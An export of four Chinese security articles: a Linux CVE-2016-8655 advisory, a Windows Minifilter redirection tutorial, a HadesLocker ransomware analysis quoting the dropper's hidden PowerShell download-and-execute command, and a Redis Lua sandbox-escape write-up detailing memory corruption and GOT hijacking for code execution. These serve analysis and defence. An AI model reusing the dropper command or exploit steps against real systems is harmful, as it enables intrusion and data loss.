"5ccbfa434f2f0a0a7a69c039","Seclists.org最新披露了Linux的竞争条件漏洞，漏洞编号为CVE-2016-8655。此漏洞可用于从低权限进程中执行内核代码。","kong","Seclists.org最新披露了Linux的竞争条件漏洞，漏洞编号为CVE-2016-8655。此漏洞可用于从低权限进程中执行内核代码。漏洞编号CVE-2016-8655漏洞概述Philip Pettersson在Linux (net/packet/af_packet.c)发现条件竞争漏洞，此漏洞可用于从未授权进程中执行内核代码。攻击者只需要本地低权限，就能利用该漏洞致拒绝服务（系统崩溃）或者以管理员权限执行任意代码packet_set_ring在创建ring buffer的时候，如果packet版本为TPACKET_V3，则会初始化struct timer_list。在packet_set_ring完成之前，其他线程可调用setsockopt将packet版本设定为TPACKET_V1。此时先前初始化的timer不会被删除，也就形成了套接字关闭时struct timer_list中函数指针的user after free漏洞。这个BUG最早出现于2011年4月19号的代码中，详细参考：https://github.com/torvalds/linux/commit/f6fb8f100b807378fda19e83e5ac6828b638603a该BUG已经于2016年11月30号被修复，详细参考：https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=84ac7260236a49c79eede91617700174c2c19b0c漏洞细节要创建AF-PACKET套接字，在网络命名空间中就需要CAP_NET_RAW。在低权限命名空间可用的系统中（Ubuntu、Fedora等），这可以通过未授权进程获取。这个漏洞在容器中即可触发，最终攻陷主机内核。在Android系统中，带gid=3004/AID_NET_RAW的进程可创建AF_PACKET套接字，并触发该BUG。问题主要出在packet_set_ring()和packet_setsockopt()中。使用PACKET_RX_RING选项在socket中调用setsockopt()，就能搞定packet_set_ring()。如果packet套接字版本为TPCKET_V3，调用init_prb_bdqc()的时候，packet_set_ring()就会对timer_list对象进行初始化。...               switch (po-&gt;tp_version) {                case TPACKET_V3:                /* Transmit path is not supported. We checked                 * it above but just being paranoid                 */                        if (!tx_ring)                                init_prb_bdqc(po, rb, pg_vec, req_u);                        break;                default:                        break;                }...创建timer的函数流为：packet_set_ring()-&gt;init_prb_bdqc()-&gt;prb_setup_retire_blk_timer()-&gt;prb_init_blk_timer()-&gt;prb_init_blk_timer()-&gt;init_timer()该套接字关闭时，packet_set_ring()会再度被调用，来释放ring buffer，并删除先前初始化的timer（当packet版本大于TPACKET_V2时）：...        if (closing &amp;&amp; (po-&gt;tp_version &gt; TPACKET_V2)) {                /* Because we don't support block-based V3 on tx-ring */                if (!tx_ring)                        prb_shutdown_retire_blk_timer(po, rb_queue);        }...此处的问题就出在，在init_prb_bdqc()执行之后，packet_set_ring()返回之前，我们可以将packet版本改为TPACKET_V1。不过ring buffer被初始化之后，会存在拒绝修改套接字版本的情况，但这也根本不是什么问题：...        case PACKET_VERSION:        {...                if (po-&gt;rx_ring.pg_vec || po-&gt;tx_ring.pg_vec)                        return -EBUSY;...在init_prb_bdqc()和packet_set_ring()的交换（rb-&gt;pg_vec, pg_vec）调用之间，还是有足够的空间来搞定这条代码路径。此时，套接字关闭时，由于套接字版本已经为TPACKET_V1，packet_set_ring()就不会删除timer。描绘timer对象的struct timer_list位于struct packet_sock中，调用kfree()就会释放。随后timer对象之上就形成了use after free漏洞，可被各种针对SLAB分配器的攻击利用。最终timer过期后，就可导致内核跳转至构建的函数指针。在packet_setsockopt()中用lock_sock(sk)，同时在packet_set_ring()起始就锁定packet版本即可解决问题。新版Ubuntu内核已经放出，用户升级至新版Ubuntu即可解决问题。漏洞PoC按照发现该漏洞的作者Philip Pettersson所说，漏洞PoC会在明天放出…修复方法如上所述，各Linux发行版需要升级至最新版Linux内核。针对Ubuntu 16.04 LTS的安全更新已经发布。另外这篇文章讲解了在不重启服务器的情况下，就对Ubuntu Linux内核打上补丁的方案。相关链接https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-8655https://github.com/torvalds/linux/commit/f6fb8f100b807378fda19e83e5ac6828b638603ahttps://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=84ac7260236a49c79eede91617700174c2c19b0chttps://www.ubuntu.com/usn/usn-3151-1/","2016-12-07","漏洞发布","【漏洞预警】CVE-2016-8655：Linux内核竞争条件漏洞，可致本地提权","http://nsoad.com/Article/exploit/20161207/vulzone-42.html"
"5ccbfa444f2f0a0a7a69c03a","为了解决例如系统关键目录或者业务敏感目录被放入恶意的可执行程序或者网页文件等，一些安全软件会使用文件过滤驱动的技术结合一定的检...","dalamar","本次实验的测试环境为Windows Server 2008 R2 X64下。为了解决例如系统关键目录或者业务敏感目录被放入恶意的可执行程序或者网页文件等，一些安全软件会使用文件过滤驱动的技术结合一定的检测规则来达到保护系统和业务安全的一些目的。简单地来看下Minifilter技术的介绍：Filter管理器随Windows一起被安装，但它只在一个minifilter驱动被加载时才会起作用。Filter管理器绑定到目标卷的文件系统栈上。Minifilter驱动为它要过滤的I/O操作而通过向filter管理器注册来间接绑定到文件系统栈上。Filter管理器随Windows一起被安装，但它只在一个minifilter驱动被加载时才会起作用。Filter管理器绑定到目标卷的文件系统栈上。Minifilter驱动为它要过滤的I/O操作而通过向filter管理器注册来间接绑定到文件系统栈上。微软的WDK实例中存在通过使用REPARSE重定向来完成跨盘的重定向，以及通过Minifilter使用IoCreateFileSpecifyDeviceObjectHint来完成的非跨盘重定向。所以，我们的目标是先通过Windows部分内核代码来看看为何Reparse能够完成文件重定向的功能，再通过实现一个能够简易配置监视路径和重定向后路径的驱动程序和应用控制程序。通过源码查看文件创建源码的关键部分虽然是Windows Server 2008 x64系统，但是为了避免过多的逆向分析,直接以WRK为目标（由于无法过多引用，所以尽量以文字描述），看看是否可以得到关于Reparse重定向的结论。创建文件的入口为IoCreateFile时，其主要工作由IopCreateFile的ObOpenObjectByName来完成，其为一个对象管理的内核函数。ObOpenObjectByName函数中主要完成的2个工作是调用ObpLookupObjectName函数即对应我们真正的文件内核对象，并通过ObpCreateHandle完成内核对象到指定句柄表的插入。其实最后的答案就在这个ObpLookupObjectName函数内，由于函数存在可选输入参数RootDirectoryHandle作为搜索的目录对象，但是类似地我们以不提供该参数的流程分析其中工作。第一步，它会使用ObpRootDirectoryObject为搜索的根目录对象，处理了以“\??\”开头的对象名，以当前进程的ProcessMap为父目录的查找。接着进入循环依次解析对象名中的每个段，在访问前非KernelMode的访问必须经过安全性检查，进入ObpLookupDirectoryEntry中其对当前层对象名计算其Hash值后与Hash数组大小37取余，其存在后继链表当获取到的对象的OBJECT_HEADER_NAME_INFO和提供的名称一致后就返回这个这个对象的地址。直接调用其对象类型的ParseProcedure（进入IopParseFile-&gt;IopParseDevice从而向对应的卷对象发送请求）。阅读后发现返回了STATUS_REPARSE后会转入ParseFromRoot处，完成从前面描述的DeviceMap处处理的重新解析。这说明了STATUS_REPARSE确实可以帮助我们完成一个文件位置到另一个文件位置的重定向（比如某类目录总是STATUS_REPARSE，而且STATUS_REPARSE在ObpLookupObjectName有次数限制），第二由于交还给对象管理器时会完完整整地重新解析，所以这确实可以完成跨盘的操作。实现可配置文件的文件系统跨盘重定向我们目标是实现一个应用程序将监控配置发送给驱动，驱动将需要重定向文件的结果报告给应用程序。其中驱动完成将在监控文件夹内的新建文件全部转移到目标文件夹下的操作。首先我们主要关心如何截获特定路径下的文件创建操作。我们先完成对卷实例的绑定工作。这个回调例程在新的卷被挂载后以及注册后已经挂载卷后被调用。在这个回调中主要通过FltGetVolumeName和完成卷的设备名称和卷标名称的获取，并通过FltAllocateContext从内存池或者lookaside表种得到获取保存上下文的内存，FltSetInstanceContext来完成设置到实例中，为了满足程序能够跨盘重定向后以DOS风格名称发送给应用程序故加入双链表中以便获取其他盘的信息。对于绑定后InstanceQueryTeardownCallback，InstanceTeardownStartCallback，InstanceTeardownCompleteCallback3类回调的处理，值得注意的是InstanceQueryTeardownCallback，因为其对应手工的解绑定，我们简单地直接返回STATUS_FLT_DO_NOT_DETACH以拒绝。现在我们来看对应主功能号为IRP_MJ_CREATE的处理，而主功能号（Minifilter中）为IRP_MJ_NETWORK_QUERY_OPEN的请求，我们也请求处理到了这里，由于其是一个Fast I/O操作，所以返回FLT_PREOP_DISALLOW_FASTIO来拒绝。我们使用了FltGetFileNameInformation和FltParseFileNameInformation来得到其文件名信息，后者是为了方便获得卷设备名以转换成DOS风格名。这个过程中，我们根据实例上下文链表及配置生成2个名称，一个是DOS风格文件名及完整文件名，前者以发送给应用程序，后者设置到FileObject中（使用IoReplaceFileObjectName），并在I/O请求包中返回STATUS_REPARSE以完成第一部分分析让这个创建操作再重新根据新名称重新从对象管理处开始处理。对于回调函数返回FLT_PREOP_COMPLETE来完成这个I/O请求，并不往下发送请求。IRP_MJ_CREATE的操作IRP_MJ_SET_INFORMATION的FileInformationClass为FileRenameInformation的处理，因为对于非跨盘的移动会通过这个请求来完成操作，所以使用同IRP_MJ_CREATE一样的操作。最后提一下Minifilter中由应用程序向驱动的信息发送和驱动主动向应用程序发送的处理。应用程序以通过FilterConnectCommunicationPort向命名的通信端口请求连接。驱动内部通过PFLT_MESSAGE_NOTIFY MessageNotifyCallback回调接受收监控的目录和重定向后的目录。最后，完成重定向后驱动使用FltSendMessage发送消息，应用程序使用FilterGetMessage获取。本次试验资源可以通过链接：http://pan.baidu.com/s/1o766JtK密码：jnsk下载。参考文档：WDK之Minifilter权威教程*本文作者：lzldhu，转载须注明来自FreeBuf.COM","2017-01-03 23:04:54","系统安全","MINIFILTER实现文件重定向之从分析到实现","http://nsoad.com/Article/system/20170103/974.html"
"5ccbfa444f2f0a0a7a69c03b","近日哈勃分析系统捕获到一类由C#语言编写的新的敲诈勒索木马。之前出现 的C#语言编写的木马只是简单地调用了一些C#库来辅助开发。","kong","近日哈勃分析系统捕获到一类由C#语言编写的新的敲诈勒索木马。之前出现 的C#语言编写的木马只是简单地调用了一些C#库来辅助开发。与之相比，这次的变种增加了多层嵌套解密、动态反射调用 等复杂手段，外加多种混淆技术， 提升了分析难度。木马加密文件时使用AES256算法， 在特定条件下可以还原加密的文件。背景简介：HadesLocker是10月份新爆发的一个敲诈勒索类木马，会加密用户 特定后缀名的文件，包括本地驱动器和网络驱动器， 加密后文件后缀为.~HL外加5个 随机字符，然后生成txt，html、png三种形式的文件来通知用户支付 赎金，桌面背景也会被改为生成的png文件。打开支付赎金的网站可以看到，用户必须支付1比特币的赎金才能获取解密 密码，并且如果在规定的时间内没有支付，赎金价格将升至2比特币 。在该网站上，木马作者将其命名为HadesLocker。此网站域名为俄罗斯顶级域名ru，无法查询到进一步的注册信息。样本分析：原始传播文件依然延续了最近的趋势，使用宏文档进行传播，打开文档之后运行宏会 启动powershell命令，下载木马主体并且运行 ：C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -w hidden -nop -ep bypass (New-Object System.Net.WebClient).DownloadFile('http://185.*.*.66/update.exe','C:\Users\ADMINI~1\AppData\Local\Temp\update345.exe'); Start-Process('C:\Users\ADMINI~1\AppData\Local\Temp\update345.exe')其中的下载IP经查询来自荷兰。下载到的update345.exe是一个rar自解压 包，打开后可以看到包含3个文件， 其中一个exe是木马启动入口，另外两个文件均是一些二进制数据。  Osiyykss.exe是一个C#程序，所有 的源码都经过了混淆，主要包括函数名与变量名混淆 ，执行流程混淆，外加垃圾指令等。例如下面是其中一个较为简单的被混淆的方法：  可以看到混淆形式如下：while(true){    switch()    case 1:    case 2：    ……}使用其中硬编码的一些大数常量，然后 通过各种运算决定进哪个执行分支，以此 混淆执行流。因此后面可以看到，本文几乎所有截图中的代码 基本都在某个switch的case里。外加所有的字符串都是动态解密的，这 对静态分析造成了很大困扰，所以主要需要依靠动态调试这个样本。Osiyykss.exe分析：Osiyykss.exe启动后首先读取压缩包内的另一个文件Krrxoeoaonmsiyyk.png， 并且开始解密：Krrxoeoaonmsiyyk.png解密后是一个C#程序集，解密 方法不算复杂，使用固定的字符串“Dlghooxwxclesvxamv” 为key，然后顺序异或加密。由此可得到 解密算法为：For i in FileSize:FileBytes[i] ^= Key[ i % KenLen ];解密后的程序集是这样的：         解密后Osiyykss.exe使用延迟绑定技术动态调用 这个名为”IE”的程序集：        IE程序集：首先木马将自身复制到AppData\Roaming\wow6232node目录 下，此目录名怀疑是模仿系统中常见的WOW6432Node的名称。然后创建一个快捷方式，指向wow6232node目录下的 新文件，并且将快捷方式设置为自启动项。             接下来读取压缩包的另一个文件Senagxehdojk.xml，并且调用IE:PolyDecrypt开始解密 ，解密的key与之前解密IE程序集的key一样 ，但是解密方法略有不同，解密算法大意如下：For i in FileSize*2:FileBytes[i % FileSize] = (BYTE)(((int)((FileBytes[i % FileSize] ^ Key[i % KeyLen]) - FileBytes[(i + 1) % FileSize]) + 256) % 256);          Senagxehdojk.xml解密后为另一个程序集S oftware，这个程序集才是敲诈木马实现 加密勒索的主要程序集，但木马十分狡猾，并没有直接调用该程序集。说回IE程序集，IE程序集资源还包含了一个PE文件:          该PE文件也是一个C#程序集，名为C Lib，IE程序集使用反射技术动态调用 资源中Clib程序集的Pe.Run()。                           CLib程序集：接下来的流程在CLib程序集 上负责执行，上图可以看到，在调用此程序集 时还使用了3个参数，Injection是.net目录 下RegAsm.exe的全路径，parameters为null ，而vfile则是之前解密的Software 程序集的资源数据。                             CLib程序集的功能比较单一，首先以 CREATE_SUSPENDED创建RegAsm.exe进程并挂起：                             然后使用PeLoader技术，将RegAsm进程 的内存镜像替换为之前解密的software程序集， 然后恢复原RegAsm.exe进程继续执行。Software程序集：此时经过了层层的动态load、内存加载技术 ，终于要到了真正加密文件的地方了，按照之前流程所述， 虽然进程是RegAsm.exe，但这时RegAsm.exe的实际内存 其实已经被替换为Software程序集了。Software程序集首先解密两段局部 变量保存的的二进制数据。第一段数据解密后发现又 是一个程序集，然后反射动态加载该程序集。因为是从一个局部硬编码 的二进制数据中解密的，所以该程序集不是很大，用Reflector可以 看到该程序集并没有实际的功能，但资源里包含两个字符串，内容是 加密所有文件后，木马生成用来通知用户 支付赎金的文本，包括HTML 与TXT。第二段数据解密后是木马 将要使用的所有的字符串数据，如赎金支付网址等。然后，Software程序集从HKEY_CURRENT_USER\Software\Wow6232Node获取hwid和status的 值，如果不存在就创建该注册表项，并计算键值。status代表当前加密状态，未加密为0，当加密完全盘后置为 1。hwid代表被感染用户的唯一ID，这个ID很重要 ，用于表明受害者的身份，计算方法如下：先生成 一段GUID，然后把其中的“ -”替换掉，最后 取前0×10个字节，转为大写，就得到了当前用户的ID。接下来，木马从http://ip-api.com/xml获取当前 的IP信息，以及获取计算机名，账户名等信息。             这些数据都获取到之后，木马会把数据发往服务器ng****tz.ru去 请求加密密钥，请求使用的是HTTP POST的方式， 参数包括之前计算的中招用户唯一ID，账户名，计算机名、 IP地址、国家信息等：hwid=****&amp;tracking_id=****&amp;usercomputername=****&amp;ip=*.*.*.*&amp;country=CN如果是在断网状态下，则木马 会不断尝试连接，直到连接成功，因此在断网状态文件不会 立即加密。服务器接收到POST请求后 返回信息为如下格式：""[STATUS=ACCEPTED][=][PASSWORD=0KDZX-zjxRf3fFwCc0aB0dpHOJEAKyirVorBCn]""其中的PASSWORD以“-” 分割为两部分。第一部分表明加密后的文件的随机后缀名 ，文件后缀名规则为.~HL加上获取到的随机字符，所以本次被加密 文件的后缀名为.~HL0KDZX 。第二部分为zjxRf3fFwCc0aB0dpHOJEAKyirVorBCn，首先把 字符串根据ascii转换为二进制，然后计算一次SHA512，HASH完 的结果长度为0×40个字节，分为2个 部分，前0×20为Key1，中间0×10个字节为Key2， 两个Key都是接下来的文件 加密算法用到的参数。接下来开始生成PNG、TXT、HTML三种格式的文件 用于通知用户，文件名规则为README_RECOVER_FILES_加HWID 再加上相应的后缀名。通知内容中， 支付赎金截止日期为系统当前时间加7天，其余一些 信息则简单做一些替换，比如用户当前的HWID、支付赎金的网站等。生成相应的文件内容后， 保存到系统关键目录下， 比如Documents，Pictures目录。做完以上步骤之后，木马开始加密文件，会被此木马加密的所有 文件后缀名如下：.contact .dbx .doc .docx .jnt .jpg .mapimail .msg .oab .ods .pdf .pps .ppsm .ppt .pptm .prf .pst .rar .rtf .txt .wab .xls .xlsx .xml .zip .1cd .3ds .3g2 .3gp .7z .7zip .accdb .aoi .asf .asp .aspx .asx .avi .bak .cer .cfg .class .config .css .csv .db .dds .dwg .dxf .flf .flv .html .idx .js .key .kwm .laccdb .ldf .lit .m3u .mbx .md .mdf .mid .mlb .mov .mp3 .mp4 .mpg .obj .odt .pages .php .psd .pwm .rm .safe .sav .save .sql .srt .swf .thm .vob .wav .wma .wmv .xlsb .3dm .aac .ai .arw .c .cdr .cls .cpi .cpp .cs .db3 .docm .dot .dotm .dotx .drw .dxb .eps .fla .flac .fxg .java .m .m4v .max .mdb .pcd .pct .pl .potm .potx .ppam .ppsm .ppsx .pptm .ps .pspima .r3d .rw2 .sldm .sldx .svg .tga .wps .xla .xlam .xlm .xlr .xlsm .xlt .xltm .xltx .xlw .act .adp .al .bkp .blend .cdf .cdx .cgm .cr2 .crt .dac .dbf .dcr .ddd .design .dtd .fdb .fff .fpx .h .iif .indd .jpeg .mos .nd .nsd .nsf .nsg .nsh .odc .odp .oil .pas .pat .pef .pfx .ptx .qbb .qbm .sas7bd .say .st4 .st6 .stc .sxc .sxw .tlg .wad .xlk .aiff .bin .bmp .cmt .dat .dit .edb .flvv .gif .groups .hdd .hpp .log .m2ts .m4p .mkv .mpeg .ndf .nvram .ogg .ost .pab .pdb .pif .png .qed .qcow .qcow2 .rvt .st7 .stm .vbox .vdi .vhd .vhdx .vmdk .vmsd .vmx .vmxf .3fr .3pr .ab4 .accde .accdr .accdt .ach .acr .adb .ads .agdl .ait .apj .asm .awg .back .backup .backup .bank .bay .bdb .bgt .bik .bpw .cdr3 .cdr4 .cdr5 .cdr6 .cdrw .ce1 .ce2 .cib .craw .crw .csh .csl .db_jou .dc2 .dcs .ddoc .ddrw .der .des .dgc .djvu .dng .drf .dxg .eml .erbsql .erf .exf .ffd .fh .fhd .gray .grey .gry .hbk .ibank .ibd .ibz .iiq .incpas .jpe .kc2 .kdbx .kdc .kpdx .lua .mdc .mef .mfw .mmw .mny .moneyw .mrw .myd .ndd .nef .nk2 .nop .nrw .ns2 .ns3 .ns4 .nwb .nx2 .nxl .nyf .odb .odf .odg .odm .orf .otg .oth .otp .ots .ott .p12 .p7b .p7c .pdd .pem .plus_m .plc .pot .pptx .psafe3 .py .qba .qbr .qbw .qbx .qby .raf .rat .raw .rdb .rwl .rwz .s3db .sd0 .sda .sdf .sqlite .sqlite .sqlite .sr2 .srf .srw .st5 .st8 .std .sti .stw .stx .sxd .sxg .sxi .sxm .tex .wallet .wb2 .wpd .x11 .x3f .xis .ycbcra .yuv在加密过程中，为了保证系统正常运行，如下几个目录会被木马跳过：Windows、program files、program files(x86)、system volume information、 $recycle.bin木马的加密方式为AES256对称加密， key为之前得到的key1， IV为key2，以0×1000为单位循环加密 ，对于文件大小小于0×1000的文件，使用0来 补齐。大于0×1000的文件，最后不够0×1000的内容重复使用 之前的buffer补齐。                                  加密完文件后，对于原始文件木马并没有 马上直接删除，而是先生成随机数进行填充 ，并且篡改了文件的创建时间、最后访问时间等，最后再进行删除 。这样做的目的是防止使用一些文件恢复工具进行恢复， 从中也可以看出此木马为了获取非法利益给受害者造成了非常大的破坏。                                在加密了全盘文件后，木马会打开HTML和TXT文件 ，并且修改桌面背景以通知用户支付赎金。密钥与解密：在加密过程中，可以看到木马使用的是 AES加密，所以如果知道密钥是可以恢复文件的，而密钥获取 是通过向服务器POST请求拿到PASSWORD，然后通过SHA512计算 来的。遗憾的是，就算使用固定的 HWID，IP等信息，每次请求获取到的PASSWORD 都不相同，可见服务器进行了一些随机化处理，因此这个方法获取 密钥是行不通的。                               不过，服务器传回的PASSWORD信息，在木马 的主体，也就是RegAsm.exe进程的 内存里可以找到，而且RegAsm.exe在完成所有加密后并不会退出， 因此如果在用户重启电脑之前，能够从内存中提取出这段密钥，可以尝试还原被加密的文件。","2016-11-19 13:16:30","系统安全","直面冥王：最新爆发的C#敲诈木马HadesLocker解读","http://nsoad.com/Article/system/20161119/817.html"
"5ccbfa444f2f0a0a7a69c03c","一、概述Redis服务器支持LUA脚本，通过如下命令行在服务器执行一段lua脚本：redis-cli &ndash;eval exp.lua -h host_ipRedis服务端实现了LUA沙盒机制，屏蔽了LUA的OS、文件","Kong","一、概述Redis服务器支持LUA脚本，通过如下命令行在服务器执行一段lua脚本：redis-cli –eval exp.lua -h host_ipRedis服务端实现了LUA沙盒机制，屏蔽了LUA的OS、文件操作等部分危险函数调用，但是未过滤loadstring函数，参考Lua虚拟机逃逸文档，即可实现Redis服务器内存读写操作，进而达成代码执行目的，本文操作测试环境Ubuntu 14.04 x64 + Redis2.8.20二、OP_CALL代码执行这是最容易想到的一种代码执行方案，因为在可以读写任意内存地址前提下，我们可以精确控制CClosure对象的f指针，使其执行linux系统的system函数。然后将其L对象内存填充为命令字符串。EXP流程如下：序号    描述1    coroutine.create 调用luaB_cocreate创建一个lua_State（lua线程）2    在新创建的lua_State对象，写入待执行的命令字符串3    coroutine.resume继续执行4    在新线程中coroutine.wrap(function() end)创建一个CClosure对象5    写CClosure对象偏移32字节的f对象，指向system函数调用6    执行CClosure函数调用7    最终n = (*curr_func(L)-&gt;c.f)(L); 完成代码执行（一）、Linux ELF内存解析利用的关键是成功获取system函数地址，通过动态解析Linux Elf内存地址可以获取任意LIBC函数地址。1、获取Redis进程基地址通过扫描内存镜像的ELF文件Basic的MAGIC标识 7f 45 4c 46即可获取Redis的内存基地址，或者直接使用基地址0x400000，默认编译器生成的Redis似乎就是这个。内存搜索的起点可以通过读CClosure对象偏移32字节的f指针，然后按照内存页对齐，依次向下搜索。2、获取LIBC基地址Linux的LIBC基地址通常做了ALSR处理，但在知道进程基地址前提下，可通过GOT表项获取到，具体见Linux GLIBC源码：elf_machine_runtime_setup函数     /* The GOT entries for functions in the PLT have not yet been filledin.  Their initial contents will arrange when called to push anoffset into the .rel.plt section, push _GLOBAL_OFFSET_TABLE_[1],and then jump to _GLOBAL_OFFSET_TABLE[2].  */got[1] = (Elf64_Addr) l;     /* Identify this shared object.  *//* The got[2] entry contains the address of a function which getscalled to get the address of a so far unresolved function andjump to it.  The profiling extension of the dynamic linker allowsto intercept the calls to collect information.  In this case wedon’t store the address in the GOT so that all future calls alsoend in this function.  */got[2] = (Elf64_Addr) &amp;_dl_runtime_resolve;其中got[1]=l -&gt;struct link_map *  struct link_map {ElfW(Addr) l_addr;                /* Base address shared object is loaded at.  */char *l_name;         /* Absolute file name object was found in.  */ElfW(Dyn) *l_ld;           /* Dynamic section of the shared object.  */struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */};通过遍历link_map链表，即可获取Redis进程加载的所有动态链接模块的基地址、名称以及DYN节信息。LIBC模块定位流程如下：序号    描述1    根据进程基地址，获取phoff2    遍历ELF的程序头表Elf_Phdr，获取PT_DYNAMIC对应地址3    解析PT_DYNAMIC执行的动态链接信息表，获取DT_PLTGOT对应的地址4    读取GOT[1]地址得到进程link_map信息5    遍历link_map链表，得到LIBC模块基地址3、获取system函数地址遍历LIBC模块的动态节信息，获取DT_SYMTAB、DT_STRTAB表地址，遍历ELF符号表，即可获取任意LIBC模块的导出函数。（二）、注意事项使用OP_CALL方式执行利用时需注意，利用前要保存好新线程lua_State的内存信息，并且写入命令长度不宜过长，否则会破坏lua_State对象，导致利用时直接内存异常，实测Ubuntu Redis x64 2.8.20一次最长执行10字节命令，0字节限制是此种利用方式最大的硬伤。三、IAT HOOKIAT HOOK是Windows系统下比较常用的一种HOOK方式，Linux系统下同样也可以使用类似技术实现系统函数劫持，Redis的LUA沙盒print函数没有被屏蔽，实际函数是luaB_print，最终通过fputs将用户提供的字符串输出到stdout。fputs(s, stdout);如果能通过IAT HOOK将fputs指向system函数，s又是用户可以控制的，唯一不同的是fputs是两个参数，system是一个参数，但x64平台下前两个参数通过RDI、RSI寄存器传递，并不会影响堆栈平衡，因此理论上是可行的。（一）、Linux IAT HOOKLinux ELF动态节信息DT_JMPREL入口处，保存了ELF重定位入口的地址，通常指向.rela.plt重定位节，类似Windows下的导入地址表。重定位节表项数据结构为Elf64_Rel/Elf64_Rela，定义如下：typedef struct{Elf64_Addr r_offset;          /* Address */Elf64_Xword      r_info;                     /* Relocation type and symbol index */Elf64_Sxword    r_addend;         /* Addend */} Elf64_Rela;Rela比Rel多了个r_addend字段，其中r_info对应重定位类型和符号表索引位置（高32位为索引，低32位为类型），通常GCC编译重定位类型为R_X86_64_JUMP_SLOT。对应的GLIBC处理函数为elf_machine_rela/elf_machine_lazy_rel，大致如下：#define ELF64_R_SYM(i)                    ((i) &gt;&gt; 32)#define ELF64_R_TYPE(i)                   ((i) &amp; 0xffffffff)elf_machine_rela (struct link_map *map, const Elf64_Rela *reloc,const Elf64_Sym *sym, const struct r_found_version *version,void *const reloc_addr_arg)Elf64_Addr *const reloc_addr = reloc_addr_arg;…struct link_map *sym_map = RESOLVE_MAP (&amp;sym, version, r_type);Elf64_Addr value = (sym == NULL ? 0 : (Elf64_Addr) sym_map-&gt;l_addr + sym-&gt;st_value);case R_X86_64_JUMP_SLOT:*reloc_addr = value + reloc-&gt;r_addend;elf_machine_lazy_rel (struct link_map *map,Elf64_Addr l_addr, const Elf64_Rela *reloc)Elf64_Addr *const reloc_addr = (void *) (l_addr + reloc-&gt;r_offset);const unsigned long int r_type = ELF64_R_TYPE (reloc-&gt;r_info);/* Check for unexpected PLT reloc type.  */if (__builtin_expect (r_type == R_X86_64_JUMP_SLOT, 1)){if (__builtin_expect (map-&gt;l_mach.plt, 0) == 0)*reloc_addr += l_addr;else*reloc_addr =map-&gt;l_mach.plt + (((Elf64_Addr) reloc_addr) – map-&gt;l_mach.gotplt) * 2;}其中reloc_addr就是重定位地址，l_addr+reloc-&gt;r_offset，通过修改该地址对应的内存数据，即可实现Linux系统的导入函数HOOK，fputs是redis进程直接导入的GLIBC函数，此时l_addr 等于link_map-&gt;l_addr为0。因此IAT HOOK流程如下序号    描述1    获取进程phdr头2    遍历程序头表，获取PT_DYNAMIC动态节3    通过DT_JMPREL信息，得到重定位表入口4    遍历重定位表项，得到Rel/Rela-&gt;r_offset以及符号表索引5    查询符号表索引是否是待HOOK函数6    如果是HOOK函数，返回r_offset7    将对应的r_offset地址内存修改为HOOK函数地址然而在Redis实际Exploite时，在执行完命令后，基本上都会出现Redis服务进程Crash现象，主要原因是LUA写内存并不完美，会多写4个字节03 00 00 00到随后的地址中，导致重定位地址表后一项函数地址被修改为无效地址，Redis测试bin中，紧随fputs符号的就是memset，该函数调用异常频繁，基本上100%崩溃。因此必须解决这个问题才能达成完美利用，此时比较容易想到的解决方案就是，先保存所有的原始重定位地址列表，然后依次向后写，通常重定位表由于内存对齐，应该会有部分空隙（未实际验证），这样我们可以将多写的4字节推移到最后一项。然而实测时发现，写重定位地址表有一定概率崩溃，毕竟LUA脚本执行时也在频繁调用导入函数，基本上到不了最后一项，Redis服务进程就已经崩溃了。（二）、突破LUA写内存限制LUA写内存不完美的最大问题在于OP_SETUPVAL时，setobj写内存时，会将4字节的tt字段写入到目标内存后4字节。如果tt数据能够被我们控制，又刚好是待写内存后的4字节值！那就能间接实现完美内存写入8字节了。tt字段怎么控制呢，只要能知道地址就好办了，毕竟可以任意地址读写了（虽然不完美）。LUA函数变量是保存在lua_State状态的临时堆栈中的struct lua_State {CommonHeader;lu_byte status;StkId top;  /* first free slot in the stack */StkId base;  /* base of current function */其中base堆栈情况，在函数调用时大致如下（参考luaD_precall代码）：func    parms1    …    parms_max    stack1    …    stack_max     base                        因此我们可以精确控制LUA函数，通过base+offset偏移地址获取到任意LUA变量的地址，并通过写内容方式控制tt内容。这里需要注意的是lua_State的堆栈是动态变化的，luaD_checkstack时会检查堆栈是否需要增长，如果堆栈预存不够，luaD_growstack调用luaD_reallocstack重分配堆栈，因此最好在需要写tt的时候再计算，防止提前计算的地址无效。offset的值可以直接通过调试器得到，只要Exp脚本不变化，偏移地址都是固定的，这是由LUA编译器决定的。一个小坑OP_SETUPVAL在setobj写12字节内存后，会立即调用luaC_barrier函数，如下      case OP_SETUPVAL: {int b=GETARG_B(i);UpVal *uv = cl-&gt;upvals[b];setobj(L, uv-&gt;v, ra);luaC_barrier(L, uv, ra);如果ra写入tt的是iscollectable(o)（ttype(o) &gt;= LUA_TSTRING）的话，会检查垃圾收集等信息，如果ra指向一个无效内存的话，就会内存读异常崩溃。在写测试代码时，尝试写入”AAAABBBBCCCC”，一直崩溃到笔者都快崩溃（就差一步就成功了），最后才意识到必须写入一个合法内存地址才能通过，而EXP恰巧就是要写入一个函数地址，真是山穷水尽疑无路，柳暗花明又一村。（三）完美EXP完美的EXP应该是没有的，只能做到尽量完美，实测在Ubuntu14.04 x64 默认编译环境下能够凑合用，测试发现有时还是会出现崩溃，毕竟写IAT 12字节不是原子操作。能执行一次命令不崩溃服务进程，其实就已经可以实用了，最后附上一张成功利用截图。","2016-10-27 00:36:53","系统安全","Redis Lua远程代码执行EXP","http://nsoad.com/Article/system/20161027/638.html"
